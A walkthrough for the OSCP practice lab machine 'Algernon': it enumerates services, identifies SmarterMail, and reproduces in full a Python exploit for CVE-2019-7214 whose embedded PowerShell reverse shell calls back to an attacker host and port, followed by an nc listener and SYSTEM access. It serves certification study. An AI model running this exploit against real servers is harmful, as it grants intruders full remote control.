---
title: OSCP Algernon - A Playground Practice machine
author: amandaguglieri
draft: false
TableOfContents: true
Date: 20250908
tags:
  - walkthrough
---
# OSCP Algernon - A Playground Practice machine


```
export ip=192.168.110.65
```


## proof.txt

Enumerate

```bash
nmap $ip
```


Output:

```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9998/tcp open  distinct32

```

Deeper enumeration:

```bash
sudo nmap -sC -sV -Pn -p- $ip
```


Output:

```
                       
PORT      STATE SERVICE       VERSION                           
21/tcp    open  ftp           Microsoft ftpd                    
| ftp-anon: Anonymous FTP login allowed (FTP code 230)          
| 04-29-20  10:31PM       <DIR>          ImapRetrieval          
| 09-08-25  11:34AM       <DIR>          Logs                   
| 04-29-20  10:31PM       <DIR>          PopRetrieval           
|_09-08-25  11:34AM       <DIR>          Spool                  
| ftp-syst:                                                     
|_  SYST: Windows_NT                                            
80/tcp    open  http          Microsoft IIS httpd 10.0          
| http-methods:                                                 
|_  Potentially risky methods: TRACE                            
|_http-title: IIS Windows                                       
|_http-server-header: Microsoft-IIS/10.0                        
135/tcp   open  msrpc         Microsoft Windows RPC             
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn     
445/tcp   open  microsoft-ds?                                   
5040/tcp  open  unknown                                         
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Mon, 08 Sep 2025 18:41:53 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-server-header: Microsoft-IIS/10.0
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -59m45s
| smb2-time: 
|   date: 2025-09-08T18:41:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.19 seconds

```


FTP  anonoymous login was enabled. It did not contain any valuable file.

Navigating to http://192.168.110.65:9998 redirects the pentester to http://192.168.110.65:9998/interface/root#/login. 

Enumerate: 

```bash
feroxbuster  --url http://$ip:9998/interface/root#/
```


Output:

```
                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.110.65:9998/interface/root#/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET       78l      305w     5199c http://192.168.110.65:9998/interface/root
301      GET        2l       10w      164c http://192.168.110.65:9998/interface/img => http://192.168.110.65:9998/interface/img/
200      GET       46l      210w     2874c http://192.168.110.65:9998/interface/download
301      GET        2l       10w      164c http://192.168.110.65:9998/interface/lib => http://192.168.110.65:9998/interface/lib/
301      GET        2l       10w      164c http://192.168.110.65:9998/interface/app => http://192.168.110.65:9998/interface/app/
301      GET        2l       10w      167c http://192.168.110.65:9998/interface/errors => http://192.168.110.65:9998/interface/errors/
301      GET        2l       10w      169c http://192.168.110.65:9998/interface/img/misc => http://192.168.110.65:9998/interface/img/misc/
301      GET        2l       10w      166c http://192.168.110.65:9998/interface/skins => http://192.168.110.65:9998/interface/skins/
301      GET        2l       10w      175c http://192.168.110.65:9998/interface/app/components => http://192.168.110.65:9998/interface/app/components/
301      GET        2l       10w      170c http://192.168.110.65:9998/interface/app/email => http://192.168.110.65:9998/interface/app/email/
302      GET        3l        8w      118c http://192.168.110.65:9998/interface/setup => http://192.168.110.65:9998/
301      GET        2l       10w      173c http://192.168.110.65:9998/interface/app/contacts => http://192.168.110.65:9998/interface/app/contacts/
301      GET        2l       10w      172c http://192.168.110.65:9998/interface/app/reports => http://192.168.110.65:9998/interface/app/reports/
301      GET        2l       10w      180c http://192.168.110.65:9998/interface/app/email/templates => http://192.168.110.65:9998/interface/app/email/templates/
301      GET        2l       10w      180c http://192.168.110.65:9998/interface/app/email/Templates => http://192.168.110.65:9998/interface/app/email/Templates/
200      GET        0l        0w        0c http://192.168.110.65:9998/interface/maintenance
301      GET        2l       10w      175c http://192.168.110.65:9998/interface/app/Components => http://192.168.110.65:9998/interface/app/Components/
301      GET        2l       10w      171c http://192.168.110.65:9998/interface/app/shared => http://192.168.110.65:9998/interface/app/shared/
301      GET        2l       10w      167c http://192.168.110.65:9998/interface/sounds => http://192.168.110.65:9998/interface/sounds/
301      GET        2l       10w      171c http://192.168.110.65:9998/interface/img/addons => http://192.168.110.65:9998/interface/img/addons/
301      GET        2l       10w      172c http://192.168.110.65:9998/interface/img/weather => http://192.168.110.65:9998/interface/img/weather/
200      GET       46l      210w     2874c http://192.168.110.65:9998/interface/Download
301      GET        2l       10w      173c http://192.168.110.65:9998/interface/app/settings => http://192.168.110.65:9998/interface/app/settings/
301      GET        2l       10w      167c http://192.168.110.65:9998/interface/Errors => http://192.168.110.65:9998/interface/Errors/
301      GET        2l       10w      174c http://192.168.110.65:9998/interface/skins/default => http://192.168.110.65:9998/interface/skins/default/
301      GET        2l       10w      172c http://192.168.110.65:9998/interface/app/Reports => http://192.168.110.65:9998/interface/app/Reports/
301      GET        2l       10w      170c http://192.168.110.65:9998/interface/app/Email => http://192.168.110.65:9998/interface/app/Email/
503      GET        6l       22w      326c http://192.168.110.65:9998/interface/app/ct
503      GET        6l       22w      326c http://192.168.110.65:9998/interface/app/Email/admin
503      GET        6l       22w      326c http://192.168.110.65:9998/interface/lib/New
503      GET        6l       22w      326c http://192.168.110.65:9998/interface/skins/imagens
503      GET        6l       22w      326c http://192.168.110.65:9998/interface/app/contacts/arquivos
503      GET        6l       22w      326c http://192.168.110.65:9998/interface/app/contacts/old_site
503      GET        6l       22w      326c http://192.168.110.65:9998/interface/app/images1
```

After this, all results are 503. There is some kind of thrlotting. However, by browsing and intercepting the request with Burpsuite, the following two requests are noticeable:

```bash
GET /api/v1/auth/login-settings HTTP/1.1
Host: 192.168.110.65:9998
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Referer: http://192.168.110.65:9998/interface/root
Pragma: no-cache
Cache-Control: no-cache


```


Output:

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
Date: Tue, 09 Sep 2025 16:16:17 GMT
Content-Length: 289

{"allowPasswordRecovery":false,"customLogo":"","customTitle":"Welcome to SmarterMail","customHelpUrl":"","customHelpText":"","customHtmlBlock":"","backgroundStillImage":"/dynamic/background-of-the-day","backgroundColor":null,"customPageTitle":"SmarterMail","success":true,"resultCode":200}
```

And

```html
GET /api/v1/licensing/about HTTP/1.1
Host: 192.168.110.65:9998
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Referer: http://192.168.110.65:9998/interface/root
Pragma: no-cache
Cache-Control: no-cache
```


Output:

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
Date: Tue, 09 Sep 2025 16:35:55 GMT
Content-Length: 67

{"version":"100.0.6919","edition":2,"enterpriseFunctionality":true}
```

Searching in google SmarterMail Service, the tester finds [this exploit for RCE](https://www.exploit-db.com/exploits/49216):



```bash
# Exploit Title: SmarterMail Build 6985 - Remote Code Execution
# Exploit Author: 1F98D
# Original Author: Soroush Dalili
# Date: 10 May 2020
# Vendor Hompage: re
# CVE: CVE-2019-7214
# Tested on: Windows 10 x64
# References:
# https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
# SmarterMail before build 6985 provides a .NET remoting endpoint
# which is vulnerable to a .NET deserialisation attack.
#
#!/usr/bin/python3
import base64
import socket
import sys
from struct import pack
HOST='192.168.110.65'
PORT=17001
LHOST='192.168.45.196'
LPORT=4444
psh_shell = '$client = New-Object System.Net.Sockets.TCPClient("'+LHOST+'",'+str(LPORT)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
psh_shell = psh_shell.encode('utf-16')[2:]
psh_shell = base64.b64encode(psh_shell)
psh_shell = psh_shell.ljust(1360, b' ')
payload = 'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAPIKL2MgcG93ZXJzaGVsbC5leGUgLWVuY29kZWRDb21tYW5kIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw=='
payload = base64.b64decode(payload)
payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)
uri = bytes('tcp://{}:{}/Servers'.format(HOST, str(PORT)), 'utf-8')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
msg = bytes()
msg += b'.NET'                 # Header
msg += b'\x01'                 # Version Major
msg += b'\x00'                 # Version Minor
msg += b'\x00\x00'             # Operation Type
msg += b'\x00\x00'             # Content Distribution
msg += pack('I', len(payload)) # Data Length
msg += b'\x04\x00'             # URI Header
msg += b'\x01'                 # Data Type
msg += b'\x01'                 # Encoding - UTF8
msg += pack('I', len(uri))     # URI Length
msg += uri                     # URI
msg += b'\x00\x00'             # Terminating Header
msg += payload                 # Data
s.send(msg)
s.close()

```

Set a listener in the attacker machine:

```bash
nc -lnvp 4444
```

Run the exploit:

```bash
python smarter.py
```

A reverse shell is obtained. Logged as NT Authority\System, print the proof.txt:

```
type C:\Users\Administrator\Desktop\proof.txt
```
